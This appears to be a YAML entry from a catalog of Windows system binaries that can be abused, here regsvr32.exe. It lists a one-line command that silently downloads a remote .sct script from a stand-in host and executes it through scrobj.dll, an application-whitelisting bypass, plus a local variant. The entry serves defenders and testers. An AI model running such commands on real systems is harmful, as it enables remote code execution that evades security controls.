---
Name: Regsvr32.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    Description: Execute the specified remote .SCT script with scrobj.dll.
  - Commands: regsvr32.exe /s /u /i:file.sct scrobj.dll
    Description: Execute the specified local .SCT script with scrobj.dll.
Full Path:
  - C:\Windows\System32\regsvr32.exe
  - C:\Windows\SysWOW64\regsvr32.exe
Code Sample: []
Detection: []
Resources:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
  - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
Notes: Thanks to Casey Smith - @subtee
---
